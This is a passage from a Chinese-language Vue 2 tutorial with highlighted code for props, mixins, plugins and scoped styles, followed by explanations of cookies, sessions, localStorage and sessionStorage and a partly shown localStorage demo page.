</code></pre></div></div></li></ol><blockquote><p>备注：props是只读的，Vue底层会监测你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容到data中一份，然后去修改data中的数据。</p></blockquote></li></ol><p>示例代码：</p><p>父组件给子组件传数据</p><p>App.vue</p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;</span><span class="k">template</span><span class="nt">&gt;</span>
  <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"app"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;img</span> <span class="na">alt=</span><span class="s">"Vue logo"</span> <span class="na">src=</span><span class="s">"./assets/logo.png"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;Student&gt;&lt;/Student&gt;</span>
    <span class="nt">&lt;School</span> <span class="na">name=</span><span class="s">"haha"</span> <span class="na">:age=</span><span class="s">"this.age"</span><span class="nt">&gt;&lt;/School&gt;</span>
  <span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/</span><span class="k">template</span><span class="nt">&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span><span class="nt">&gt;</span>
<span class="k">import</span> <span class="nx">School</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">./components/School.vue</span><span class="dl">'</span>
<span class="k">import</span> <span class="nx">Student</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">./components/Student.vue</span><span class="dl">'</span>

<span class="k">export</span> <span class="k">default</span> <span class="p">{</span>
  <span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">App</span><span class="dl">'</span><span class="p">,</span>
  <span class="nx">data</span> <span class="p">()</span> <span class="p">{</span>
    <span class="k">return</span> <span class="p">{</span>
      <span class="na">age</span><span class="p">:</span> <span class="mi">360</span>  
    <span class="p">}</span>
  <span class="p">},</span>
  <span class="na">components</span><span class="p">:</span> <span class="p">{</span>
    <span class="nx">School</span><span class="p">,</span>
    <span class="nx">Student</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>

<span class="nt">&lt;</span><span class="k">style</span><span class="nt">&gt;</span>
<span class="nf">#app</span> <span class="p">{</span>
  <span class="nl">font-family</span><span class="p">:</span> <span class="n">Avenir</span><span class="p">,</span> <span class="n">Helvetica</span><span class="p">,</span> <span class="n">Arial</span><span class="p">,</span> <span class="nb">sans-serif</span><span class="p">;</span>
  <span class="nl">-webkit-font-smoothing</span><span class="p">:</span> <span class="n">antialiased</span><span class="p">;</span>
  <span class="nl">-moz-osx-font-smoothing</span><span class="p">:</span> <span class="n">grayscale</span><span class="p">;</span>
  <span class="nl">text-align</span><span class="p">:</span> <span class="nb">center</span><span class="p">;</span>
  <span class="nl">color</span><span class="p">:</span> <span class="m">#2c3e50</span><span class="p">;</span>
  <span class="nl">margin-top</span><span class="p">:</span> <span class="m">60px</span><span class="p">;</span>
<span class="p">}</span>
<span class="nt">&lt;/</span><span class="k">style</span><span class="nt">&gt;</span>

</code></pre></div></div><p>School.vue</p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;</span><span class="k">template</span><span class="nt">&gt;</span>
  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"demo"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;h2&gt;</span>学校名称：<span class="nt">&lt;/h2&gt;</span>
    <span class="nt">&lt;h2&gt;</span>学校年龄：<span class="nt">&lt;/h2&gt;</span>
    <span class="nt">&lt;h2&gt;</span>学校地址：<span class="nt">&lt;/h2&gt;</span>
    <span class="nt">&lt;button</span> <span class="err">@</span><span class="na">click=</span><span class="s">"showName"</span><span class="nt">&gt;</span>点我提示学校名<span class="nt">&lt;/button&gt;</span>
  <span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/</span><span class="k">template</span><span class="nt">&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span><span class="nt">&gt;</span>
<span class="k">export</span> <span class="k">default</span> <span class="p">{</span>
  <span class="na">name</span><span class="p">:</span> <span class="dl">"</span><span class="s2">School</span><span class="dl">"</span><span class="p">,</span>
  <span class="c1">// 最简单的写法：props: ['name', 'age']</span>
  <span class="na">props</span><span class="p">:</span> <span class="p">{</span>
    <span class="na">name</span><span class="p">:</span> <span class="p">{</span>
      <span class="na">type</span><span class="p">:</span> <span class="nb">String</span><span class="p">,</span>
      <span class="na">required</span><span class="p">:</span> <span class="kc">true</span> <span class="c1">// 必须要传的</span>
    <span class="p">},</span>
    <span class="na">age</span><span class="p">:</span> <span class="p">{</span>
      <span class="na">type</span><span class="p">:</span> <span class="nb">Number</span><span class="p">,</span>
      <span class="na">required</span><span class="p">:</span> <span class="kc">true</span>
    <span class="p">}</span>
  <span class="p">},</span>
  <span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">return</span> <span class="p">{</span>
      <span class="na">address</span><span class="p">:</span> <span class="dl">"</span><span class="s2">北京昌平</span><span class="dl">"</span><span class="p">,</span>
    <span class="p">};</span>
  <span class="p">},</span>
  <span class="na">methods</span><span class="p">:</span> <span class="p">{</span>
    <span class="nx">showName</span><span class="p">()</span> <span class="p">{</span>
      <span class="nx">alert</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">name</span><span class="p">);</span>
    <span class="p">},</span>
  <span class="p">},</span>
<span class="p">};</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>

<span class="nt">&lt;</span><span class="k">style</span><span class="nt">&gt;</span>
<span class="nc">.demo</span> <span class="p">{</span>
  <span class="nl">background-color</span><span class="p">:</span> <span class="no">orange</span><span class="p">;</span>
<span class="p">}</span>
<span class="nt">&lt;/</span><span class="k">style</span><span class="nt">&gt;</span>
</code></pre></div></div><h3 id="mixin混入">mixin(混入)</h3><p>混入 (mixin) 提供了一种非常灵活的方式，来分发 Vue 组件中的可复用功能。一个混入对象可以包含任意组件选项。当组件使用混入对象时，所有混入对象的选项将被“混合”进入该组件本身的选项。</p><p>例子：</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 定义一个混入对象</span>
<span class="kd">var</span> <span class="nx">myMixin</span> <span class="o">=</span> <span class="p">{</span>
  <span class="na">created</span><span class="p">:</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="k">this</span><span class="p">.</span><span class="nx">hello</span><span class="p">()</span>
  <span class="p">},</span>
  <span class="na">methods</span><span class="p">:</span> <span class="p">{</span>
    <span class="na">hello</span><span class="p">:</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">hello from mixin!</span><span class="dl">'</span><span class="p">)</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="c1">// 定义一个使用混入对象的组件</span>
<span class="kd">var</span> <span class="nx">Component</span> <span class="o">=</span> <span class="nx">Vue</span><span class="p">.</span><span class="nx">extend</span><span class="p">({</span>
  <span class="na">mixins</span><span class="p">:</span> <span class="p">[</span><span class="nx">myMixin</span><span class="p">]</span>
<span class="p">})</span>
</code></pre></div></div><p><strong>选项合并</strong></p><p>当组件和混入对象含有同名选项时，这些选项将以恰当的方式进行“合并”。</p><p>比如，数据对象在内部会进行递归合并，并在发生冲突时以组件数据优先。</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">mixin</span> <span class="o">=</span> <span class="p">{</span>
  <span class="na">data</span><span class="p">:</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="k">return</span> <span class="p">{</span>
      <span class="na">message</span><span class="p">:</span> <span class="dl">'</span><span class="s1">hello</span><span class="dl">'</span><span class="p">,</span>
      <span class="na">foo</span><span class="p">:</span> <span class="dl">'</span><span class="s1">abc</span><span class="dl">'</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
  <span class="na">mixins</span><span class="p">:</span> <span class="p">[</span><span class="nx">mixin</span><span class="p">],</span>
  <span class="na">data</span><span class="p">:</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="k">return</span> <span class="p">{</span>
      <span class="na">message</span><span class="p">:</span> <span class="dl">'</span><span class="s1">goodbye</span><span class="dl">'</span><span class="p">,</span>
      <span class="na">bar</span><span class="p">:</span> <span class="dl">'</span><span class="s1">def</span><span class="dl">'</span>
    <span class="p">}</span>
  <span class="p">},</span>
  <span class="na">created</span><span class="p">:</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">$data</span><span class="p">)</span>
    <span class="c1">// =&gt; { message: "goodbye", foo: "abc", bar: "def" }</span>
  <span class="p">}</span>
<span class="p">})</span>
</code></pre></div></div><p>同名钩子函数将合并为一个数组，因此都将被调用。另外，混入对象的钩子将在组件自身钩子<strong>之前</strong>调用。</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">mixin</span> <span class="o">=</span> <span class="p">{</span>
  <span class="na">created</span><span class="p">:</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">混入对象的钩子被调用</span><span class="dl">'</span><span class="p">)</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
  <span class="na">mixins</span><span class="p">:</span> <span class="p">[</span><span class="nx">mixin</span><span class="p">],</span>
  <span class="na">created</span><span class="p">:</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">组件钩子被调用</span><span class="dl">'</span><span class="p">)</span>
  <span class="p">}</span>
<span class="p">})</span>

<span class="c1">// =&gt; "混入对象的钩子被调用"</span>
<span class="c1">// =&gt; "组件钩子被调用"</span>
</code></pre></div></div><p>值为对象的选项，例如 <code class="language-plaintext highlighter-rouge">methods</code>、<code class="language-plaintext highlighter-rouge">components</code> 和 <code class="language-plaintext highlighter-rouge">directives</code>，将被合并为同一个对象。两个对象键名冲突时，取组件对象的键值对。</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">mixin</span> <span class="o">=</span> <span class="p">{</span>
  <span class="na">methods</span><span class="p">:</span> <span class="p">{</span>
    <span class="na">foo</span><span class="p">:</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">foo</span><span class="dl">'</span><span class="p">)</span>
    <span class="p">},</span>
    <span class="na">conflicting</span><span class="p">:</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">from mixin</span><span class="dl">'</span><span class="p">)</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="kd">var</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
  <span class="na">mixins</span><span class="p">:</span> <span class="p">[</span><span class="nx">mixin</span><span class="p">],</span>
  <span class="na">methods</span><span class="p">:</span> <span class="p">{</span>
    <span class="na">bar</span><span class="p">:</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">bar</span><span class="dl">'</span><span class="p">)</span>
    <span class="p">},</span>
    <span class="na">conflicting</span><span class="p">:</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">from self</span><span class="dl">'</span><span class="p">)</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">})</span>

<span class="nx">vm</span><span class="p">.</span><span class="nx">foo</span><span class="p">()</span> <span class="c1">// =&gt; "foo"</span>
<span class="nx">vm</span><span class="p">.</span><span class="nx">bar</span><span class="p">()</span> <span class="c1">// =&gt; "bar"</span>
<span class="nx">vm</span><span class="p">.</span><span class="nx">conflicting</span><span class="p">()</span> <span class="c1">// =&gt; "from self"</span>
</code></pre></div></div><blockquote><p>全局混入不建议使用</p></blockquote><h3 id="插件">插件</h3><p>插件通常用来为 Vue 添加全局功能。插件的功能范围没有严格的限制。</p><p>通过全局方法 <code class="language-plaintext highlighter-rouge">Vue.use()</code> 使用插件。它需要在你调用 <code class="language-plaintext highlighter-rouge">new Vue()</code> 启动应用之前完成：</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 调用 `MyPlugin.install(Vue)`</span>
<span class="nx">Vue</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">MyPlugin</span><span class="p">)</span>

<span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
  <span class="c1">// ...组件选项</span>
<span class="p">})</span>
</code></pre></div></div><p>本质：包含install方法的一个对象，install的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据。</p><p>定义插件：</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">对象</span><span class="p">.</span><span class="nx">install</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">Vue</span><span class="p">,</span> <span class="nx">options</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// 1. 添加全局过滤器</span>
    <span class="nx">Vue</span><span class="p">.</span><span class="nx">filter</span><span class="p">(....)</span>

    <span class="c1">// 2. 添加全局指令</span>
    <span class="nx">Vue</span><span class="p">.</span><span class="nx">directive</span><span class="p">(....)</span>

    <span class="c1">// 3. 配置全局混入(合)</span>
    <span class="nx">Vue</span><span class="p">.</span><span class="nx">mixin</span><span class="p">(....)</span>

    <span class="c1">// 4. 添加实例方法</span>
    <span class="nx">Vue</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">$myMethod</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{...}</span>
    <span class="nx">Vue</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">$myProperty</span> <span class="o">=</span> <span class="nx">xxxx</span>
<span class="p">}</span>
</code></pre></div></div><p>具体案例：</p><p>plugin.js</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">export</span> <span class="k">default</span> <span class="p">{</span>
    <span class="nx">install</span><span class="p">(</span><span class="nx">Vue</span><span class="p">,</span> <span class="nx">x</span><span class="p">,</span> <span class="nx">y</span><span class="p">,</span> <span class="nx">z</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span> <span class="nx">y</span><span class="p">,</span> <span class="nx">z</span><span class="p">)</span>
        <span class="c1">//全局过滤器</span>
        <span class="nx">Vue</span><span class="p">.</span><span class="nx">filter</span><span class="p">(</span><span class="dl">'</span><span class="s1">mySlice</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nx">value</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
        <span class="p">})</span>

        <span class="c1">//定义全局指令</span>
        <span class="nx">Vue</span><span class="p">.</span><span class="nx">directive</span><span class="p">(</span><span class="dl">'</span><span class="s1">fbind</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span>
            <span class="c1">//指令与元素成功绑定时（一上来）</span>
            <span class="nx">bind</span><span class="p">(</span><span class="nx">element</span><span class="p">,</span> <span class="nx">binding</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">element</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">binding</span><span class="p">.</span><span class="nx">value</span>
            <span class="p">},</span>
            <span class="c1">//指令所在元素被插入页面时</span>
            <span class="nx">inserted</span><span class="p">(</span><span class="nx">element</span><span class="p">,</span> <span class="nx">binding</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">element</span><span class="p">.</span><span class="nx">focus</span><span class="p">()</span>
            <span class="p">},</span>
            <span class="c1">//指令所在的模板被重新解析时</span>
            <span class="nx">update</span><span class="p">(</span><span class="nx">element</span><span class="p">,</span> <span class="nx">binding</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">element</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">binding</span><span class="p">.</span><span class="nx">value</span>
            <span class="p">}</span>
        <span class="p">})</span>

        <span class="c1">//定义混入</span>
        <span class="nx">Vue</span><span class="p">.</span><span class="nx">mixin</span><span class="p">({</span>
            <span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
                <span class="k">return</span> <span class="p">{</span>
                    <span class="na">x</span><span class="p">:</span> <span class="mi">100</span><span class="p">,</span>
                    <span class="na">y</span><span class="p">:</span> <span class="mi">200</span>
                <span class="p">}</span>
            <span class="p">},</span>
        <span class="p">})</span>

        <span class="c1">//给Vue原型上添加一个方法（vm和vc就都能用了）</span>
        <span class="nx">Vue</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">hello</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span> <span class="nx">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">你好啊aaaa</span><span class="dl">'</span><span class="p">)</span> <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div><p>main.js</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 引入插件</span>
<span class="k">import</span> <span class="nx">plugin</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">./plugin</span><span class="dl">'</span>

<span class="c1">// 使用插件</span>
<span class="nx">Vue</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">plugin</span><span class="p">)</span>
</code></pre></div></div><p>然后就可以在别的组件使用插件里的功能了。</p><h3 id="scoped样式">scoped样式</h3><ol><li>作用：让样式在局部生效，防止冲突。</li><li>写法：<code class="language-plaintext highlighter-rouge">&lt;style scoped&gt;</code></li></ol><p>具体案例：</p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;</span><span class="k">style</span> <span class="na">lang=</span><span class="s">"less"</span> <span class="na">scoped</span><span class="nt">&gt;</span>
	.demo{
		background-color: pink;
		.atguigu{
			font-size: 40px;
		}
	}
<span class="nt">&lt;/</span><span class="k">style</span><span class="nt">&gt;</span>
</code></pre></div></div><h3 id="总结todolist案例">总结TodoList案例</h3><ol><li><p>组件化编码流程：</p><p>​ (1).拆分静态组件：组件要按照功能点拆分，命名不要与html元素冲突。</p><p>​ (2).实现动态组件：考虑好数据的存放位置，数据是一个组件在用，还是一些组件在用：</p><p>​ 1).一个组件在用：放在组件自身即可。</p><p>​ 2). 一些组件在用：放在他们共同的父组件上（<span style="color:red">状态提升</span>）。</p><p>​ (3).实现交互：从绑定事件开始。</p></li><li><p>props适用于：</p><p>​ (1).父组件 ==&gt; 子组件 通信</p><p>​ (2).子组件 ==&gt; 父组件 通信（要求父先给子一个函数）</p></li><li><p>使用v-model时要切记：v-model绑定的值不能是props传过来的值，因为props是不可以修改的！</p></li><li><p>props传过来的若是对象类型的值，修改对象中的属性时Vue不会报错，但不推荐这样做。</p></li></ol><h2 id="23-浏览器本地存储">2.3 浏览器本地存储</h2><h3 id="cookie">Cookie</h3><p>Cookie是最早被提出来的本地存储方式，在此之前，服务端是无法判断网络中的两个请求是否是同一用户发起的，为解决这个问题，Cookie就出现了。Cookie 是存储在用户浏览器中的一段不超过 4 KB 的字符串。它由一个名称（Name）、一个值（Value）和其它几个用 于控制 Cookie 有效期、安全性、使用范围的可选属性组成。<strong>不同域名下的 Cookie 各自独立，每当客户端发起请求时，会自动把当前域名下所有未过期的 Cookie 一同发送到服务器</strong>。</p><p><strong>Cookie的特性：</strong></p><ul><li>Cookie一旦创建成功，名称就无法修改</li><li>Cookie是无法跨域名的，也就是说a域名和b域名下的cookie是无法共享的，这也是由Cookie的隐私安全性决定的，这样就能够阻止非法获取其他网站的Cookie</li><li>每个域名下Cookie的数量不能超过20个，每个Cookie的大小不能超过4kb</li><li>有安全问题，如果Cookie被拦截了，那就可获得session的所有信息，即使加密也于事无补，无需知道cookie的意义，只要转发cookie就能达到目的</li><li>Cookie在请求一个新的页面的时候都会被发送过去</li></ul><p><strong>Cookie 在身份认证中的作用</strong></p><p>客户端第一次请求服务器的时候，服务器通过响应头的形式，向客户端发送一个身份认证的 Cookie，客户端会自动 将 Cookie 保存在浏览器中。</p><p>随后，当客户端浏览器每次请求服务器的时候，浏览器会自动将身份认证相关的 Cookie，通过请求头的形式发送给 服务器，服务器即可验明客户端的身份。</p><p><img src="https://img-blog.csdnimg.cn/e29b7e0bef784bc5b6b8ed50b0d8a509.png" alt="在这里插入图片描述" /></p><p><strong>Cookie 不具有安全性</strong></p><p><strong>由于 Cookie 是存储在浏览器中的，而且浏览器也提供了读写 Cookie 的 API，因此 Cookie 很容易被伪造，不具有安全 性。</strong>因此不建议服务器将重要的隐私数据，通过 Cookie 的形式发送给浏览器。 <img src="https://img-blog.csdnimg.cn/b9b6daf6fb35419b985cf37a32ddd7d3.png" alt="在这里插入图片描述" /></p><blockquote><p>注意：千万不要使用 Cookie 存储重要且隐私的数据！比如用户的身份信息、密码等。</p></blockquote><p><strong>提高身份认证的安全性</strong></p><p>为了防止客户伪造会员卡，收银员在拿到客户出示的会员卡之后，可以在收银机上进行刷卡认证。只有收银机确认存在的 会员卡，才能被正常使用。</p><p><img src="https://img-blog.csdnimg.cn/9ef4ea4be35242d9a2c2a9c49058d638.png" alt="在这里插入图片描述" /></p><p>这种“会员卡 + 刷卡认证”的设计理念，就是 Session 认证机制的精髓。</p><h3 id="session">Session</h3><p>Session是另一种记录客户状态的机制，不同的是Cookie保存在客户端浏览器中，而Session保存在服务器上。<strong>客户端浏览器访问服务器的时候，服务器把客户端信息以某种形式记录在服务器上。</strong>这就是Session。客户端浏览器再次访问时只需要从该Session中查找该客户的状态就可以了。</p><p>如果说Cookie机制是通过检查客户身上的“会员卡”来确定客户身份的话，那么Session机制就是通过检查服务器上的“客户明细表”来确认客户身份（就类似于刷卡机）。Session相当于程序在服务器上建立的一份客户档案，客户来访的时候只需要查询客户档案表就可以了。</p><p><strong>session 工作流程</strong></p><p><img src="https://img-blog.csdnimg.cn/10472e8e03924340a452523ae678de02.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaGFuZ2FvMjMz,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" /></p><p>我在 node.js 中详细演示了一遍 session 的使用，具体看了另一篇博客：https://blog.csdn.net/hangao233/article/details/123089029</p><h3 id="localstorage">LocalStorage</h3><p>LocalStorage是HTML5新引入的特性，由于有的时候我们存储的信息较大，Cookie就不能满足我们的需求，这时候LocalStorage就派上用场了。</p><p><strong>LocalStorage的优点：</strong></p><ul><li>在大小方面，LocalStorage的大小一般为<strong>5MB</strong>，可以储存更多的信息</li><li>LocalStorage是持久储存，并不会随着页面的关闭而消失，除非主动清理，不然会永久存在</li><li>仅储存在本地，不像Cookie那样每次HTTP请求都会被携带</li></ul><p><strong>LocalStorage的缺点：</strong></p><ul><li>存在浏览器兼容问题，IE8以下版本的浏览器不支持</li><li>如果浏览器设置为隐私模式，那我们将无法读取到LocalStorage</li><li>LocalStorage受到同源策略的限制，即端口、协议、主机地址有任何一个不相同，都不会访问</li></ul><p><strong>LocalStorage的常用API：</strong></p><pre><code class="language-JS">// 保存数据到 localStorage
localStorage.setItem('key', 'value');

// 从 localStorage 获取数据
let data = localStorage.getItem('key');

// 从 localStorage 删除保存的数据
localStorage.removeItem('key');

// 从 localStorage 删除所有保存的数据
localStorage.clear();

// 获取某个索引的Key
localStorage.key(index)
</code></pre><p><strong>LocalStorage的使用场景:</strong></p><ul><li>有些网站有换肤的功能，这时候就可以将换肤的信息存储在本地的LocalStorage中，当需要换肤的时候，直接操作LocalStorage即可</li><li>在网站中的用户浏览信息也会存储在LocalStorage中，还有网站的一些不常变动的个人信息等也可以存储在本地的LocalStorage中</li></ul><h3 id="sessionstorage">SessionStorage</h3><p>SessionStorage和LocalStorage都是在HTML5才提出来的存储方案，SessionStorage 主要用于临时保存同一窗口(或标签页)的数据，刷新页面时不会删除，关闭窗口或标签页之后将会删除这些数据。</p><p><strong>SessionStorage与LocalStorage对比：</strong></p><ul><li>SessionStorage和LocalStorage都在<strong>本地进行数据存储</strong>；</li><li>SessionStorage也有同源策略的限制，但是SessionStorage有一条更加严格的限制，SessionStorage<strong>只有在同一浏览器的同一窗口下才能够共享</strong>；</li><li>LocalStorage和SessionStorage<strong>都不能被爬虫爬取</strong>；</li></ul><p><strong>SessionStorage的常用API：</strong></p><pre><code class="language-JS">// 保存数据到 sessionStorage
sessionStorage.setItem('key', 'value');

// 从 sessionStorage 获取数据
let data = sessionStorage.getItem('key');

// 从 sessionStorage 删除保存的数据
sessionStorage.removeItem('key');

// 从 sessionStorage 删除所有保存的数据
sessionStorage.clear();

// 获取某个索引的Key
sessionStorage.key(index)
</code></pre><p><strong>SessionStorage的使用场景</strong></p><p>由于SessionStorage具有时效性，所以可以用来存储一些网站的游客登录的信息，还有临时的浏览记录的信息。当关闭网站之后，这些信息也就随之消除了。</p><blockquote><p>具体案例：</p></blockquote><p><strong>localStorage</strong></p><div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span> <span class="nt">/&gt;</span>
		<span class="nt">&lt;title&gt;</span>localStorage<span class="nt">&lt;/title&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;h2&gt;</span>localStorage<span class="nt">&lt;/h2&gt;</span>
		<span class="nt">&lt;button</span> <span class="na">onclick=</span><span class="s">"saveData()"</span><span class="nt">&gt;</span>点我保存一个数据<span class="nt">&lt;/button&gt;</span>
		<span class="nt">&lt;button</span> <span class="na">onclick=</span><span class="s">"readData()"</span><span class="nt">&gt;</span>点我读取一个数据<span class="nt">&lt;/button&gt;</span>
		<span class="nt">&lt;button</span> <span class="na">onclick=</span><span class="s">"deleteData()"</span><span class="nt">&gt;</span>点我删除一个数据<span class="nt">&lt;/button&gt;</span>
		<span class="nt">&lt;button</span> <span class="na">onclick=</span><span class="s">"deleteAllData()"</span><span class="nt">&gt;</span>点我清空一个数据<span class="nt">&lt;/button&gt;</span>

		<span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span> <span class="nt">&gt;</span>
			<span class="kd">let</span> <span class="nx">p</span> <span class="o">=</span> <span class="p">{</span><span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">张三</span><span class="dl">'</span><span class="p">,</span><span class="na">age</span><span class="p">:</span><span class="mi">18</span><span class="p">}</span>

			<span class="kd">function</span> <span class="nx">saveData</span><span class="p">(){</span>
				<span class="nx">localStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">(</span><span class="dl">'</span><span class="s1">msg</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">hello!!!</span><span class="dl">'</span><span class="p">)</span>
				<span class="nx">localStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">(</span><span class="dl">'</span><span class="s1">msg2</span><span class="dl">'</span><span class="p">,</span><span class="mi">666</span><span class="p">)</span>
                <span class="c1">// 转成 JSON 对象存进去</span>
				<span class="nx">localStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">(</span><span class="dl">'</span><span class="s1">person</span><span class="dl">'</span><span class="p">,</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">p</span><span class="p">))</span>
			<span class="p">}</span>
			<span class="kd">function</span> <span class="nx">readData</span><span class="p">(){</span>
				<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="dl">'</span><span class="s1">msg</span><span class="dl">'</span><span class="p">))</span>
				<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="dl">'</span><span class="s1">msg2</span><span class="dl">'</span><span class="p">))</span>

				<span class="kd">const</span> <span class="nx">result</span> <span class="o">=</span> <span class="nx">localStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="dl">'</span><span class="s1">person</span><span class="dl">'</span><span class="p">)</span>
				<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">result</span><span class="p">))</span>

				<span class="c1">// console.log(localStorage.getItem('msg3'))</span>
			<span class="p">}</span>
			<span class="kd">function</span> <span class="nx">deleteData</span><span class="p">(){</span>
